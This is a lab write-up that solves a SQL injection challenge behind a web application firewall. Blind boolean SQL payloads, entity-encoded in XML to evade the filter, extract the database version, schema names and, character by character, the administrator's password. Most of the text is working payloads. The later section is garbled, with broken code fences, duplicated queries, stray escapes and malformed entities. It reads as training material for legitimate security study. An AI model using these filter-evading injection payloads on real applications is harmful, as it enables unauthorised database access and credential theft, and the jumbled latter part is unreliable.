# SQL injection with filter bypass via XML encoding

This lab contains a SQL injection vulnerability in the stock-check
functionality. The query result is reflected in the application's
response, making UNION-style extraction possible.

The database contains a `users` table with usernames and passwords. The
objective is to retrieve the administrator credentials and use them to
log in.

A WAF blocks requests containing obvious SQL injection patterns, so the
SQL syntax must be obfuscated. The lab recommends using the Hackvertor
extension for the encoding step.

------------------------------------------------------------------------

References:

-   https://portswigger.net/web-security/sql-injection
-   https://portswigger.net/web-security/sql-injection/cheat-sheet

**Pic 1**

------------------------------------------------------------------------

The following XML payload executes `(SELECT 1)`. Its result is
equivalent to sending `productId` 1 and `storeId` 1:

    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            (&#x53;ELECT 1)
        </productId>
        <storeId>
            (&#x53;ELECT 1)
        </storeId>
    </stockCheck>

**Pic 2**

**Pic 3**

The SQL can be HTML-encoded to make the request less obvious to the
filter. The complete encoded form of `(SELECT 1)` is:

    (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x31;)

The next test uses a conditional expression:

    SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END

The XML-encoded form is:

    <productId>
    (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x31;&#x3d;&#x31;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;&#x0a;)
    </productId>

**Pic 4**

The same technique can be used to determine the database version:

    SELECT CASE WHEN (substring((SELECT version()),1,1)='a') THEN 1 ELSE 2 END

The request is sent to Intruder with a delay between requests.

**Pic 5**

The first character of the version is identified as `P`.

**Pic 6**

The next character is `o`.

**Pic 7**

The version is confirmed as PostgreSQL:

    SELECT CASE WHEN (substring((SELECT version()),1,10)='PostgreSQL') THEN 1 ELSE 2 END

    (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x28;&#x29;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x30;&#x29;&#x3d;&#x27;&#x50;&#x6f;&#x73;&#x74;&#x67;&#x72;&#x65;&#x53;&#x51;&#x4c;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)

**Pic 8**

The next check identifies whether a `users` table exists:

    SELECT CASE WHEN (substring((SELECT table_name FROM information_schema.tables limit 1),1,5)='users') THEN 1 ELSE 2 END

    (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x73;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x35;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)

The response is the same as sending the value `1`, confirming that the
`users` table exists.

**Pic 9**

The first column name is then identified from the `users` table:

    SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,1)='a') THEN 1 ELSE 2 END

    (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x29;&#x3d;&#x27;AAAAAAAA&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)

The first character is `u`, suggesting that the column begins with
`user`.

**Pic 10**

The first four characters are confirmed as `user`:

    SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,4)='user') THEN 1 ELSE 2 END

    &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x34;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;

The next character is `n`, so the column is likely `username`.

**Pic 11**

The complete first column name is verified as `username`:

    SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,5)='userZ') THEN 1 ELSE 2 END

    SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,8)='username') THEN 1 ELSE 2 END

    &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x38;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
    ``` text
    SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' and column_name!='username' limit 1),1,8)='password') THEN 1 ELSE 2 END

SELECT CASE WHEN (substring((SELECT column_name FROM
information_schema.columns where table_name = 'users' limit
1),1,9)='usernameZ') THEN 1 ELSE 2 END

``` text
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72&#x27;&#x73&#x27;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x21;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72&#x6e;&#x61&#x6d;&#x65&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31&#x29;&#x2c;&#x31;&#x2c;&#x38;&#x29;&#x3d;&#x27;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```

SELECT CASE WHEN (substring((SELECT column_name FROM
information_schema.columns where table_name = 'users' and
column_name!='username' limit 1),1,8)='password') THEN 1 ELSE 2 END
`\nSELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,9)='usernameZ') THEN 1 ELSE 2 END\n`
SELECT CASE WHEN (substring((SELECT column_name FROM
information_schema.columns where table_name = \'users\' and
column_name!=\'username\' limit 1),1,8)=\'password\') THEN 1 ELSE 2 END

``` text
SELECT CASE WHEN (substring((SELECT password FROM users where username = 'administrator'),1,1)='a') THEN 1 ELSE 2 END
```

SELECT CASE WHEN (substring((SELECT password FROM users where username =
'administrator'),1,1)='a') THEN 1 ELSE 2 END

``` text
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x29;&#x3d;&#x27;ZZZZZZZZZZ&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```

The first character is identified as `h`.

**Pic 15**

The remaining characters can be tested in the same manner until the
administrator password is recovered.

**Pic 16**

The final result is shown here.

**Pic 17**
